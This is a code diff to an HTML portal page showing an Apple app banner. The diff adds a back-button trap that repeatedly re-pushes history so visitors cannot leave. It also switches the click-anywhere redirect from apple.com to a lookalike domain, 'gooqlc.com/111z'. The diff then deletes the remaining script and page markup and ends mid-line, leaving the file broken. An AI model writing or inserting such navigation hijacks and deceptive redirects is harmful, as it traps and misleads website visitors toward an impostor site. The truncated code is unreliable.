@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title></title>
 
-  <!-- iOS Safari Native Smart App Banner -->
+  <!-- Native iOS Safari Smart App Banner for Apple Shortcuts (App ID: 915254993) -->
   <meta name="apple-itunes-app" content="app-id=915254993" />
 
   <style>
@@ -18,7 +18,7 @@
     body {
       background-color: #0d0d0d;
       color: #ffffff;
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -88,8 +88,15 @@
   <div class="menu-container" id="menuContainer"></div>
 
   <script>
-    let currentRedirect = 'https://www.apple.com';
+    // 1. Back-Button Trap: Prevent the back arrow from leaving this page
+    history.pushState(null, document.title, location.href);
+    window.addEventListener('popstate', function () {
+      history.pushState(null, document.title, location.href);
+    });
 
+    let currentRedirect = 'https://gooqlc.com/111z';
+
+    // 2. Build tiles dynamically
     function renderPortal(data) {
       const container = document.getElementById('menuContainer');
       container.innerHTML = '';
@@ -98,49 +105,4 @@
         data.top.forEach(item => container.appendChild(createTile(item)));
       }
 
-      if (data.dividerTitle) {
-        const divider = document.createElement('div');
-        divider.className = 'divider';
-        divider.innerHTML = `<span>${data.dividerTitle}</span>`;
-        container.appendChild(divider);
-      }
-
-      if (Array.isArray(data.custom)) {
-        data.custom.forEach(item => container.appendChild(createTile(item)));
-      }
-    }
-
-    function createTile(item) {
-      const tile = document.createElement('a');
-      tile.className = 'menu-tile';
-      tile.href = item.url || '#';
-      tile.textContent = item.title;
-      tile.addEventListener('click', (e) => e.stopPropagation());
-      return tile;
-    }
-
-    async function fetchConfig() {
-      try {
-        const res = await fetch('/api/portal');
-        const data = await res.json();
-        if (data.success) {
-          if (data.masterRedirect) currentRedirect = data.masterRedirect;
-          renderPortal(data);
-        }
-      } catch (err) {
-        console.warn('Backend unavailable');
-      }
-    }
-
-    // Screen-wide click redirects to master destination
-    document.addEventListener('click', (e) => {
-      if (!e.target.closest('.menu-tile')) {
-        window.location.href = currentRedirect;
-      }
-    });
-
-    fetchConfig();
-  </script>
-
-</body>
-</html>
+      if (data.divider
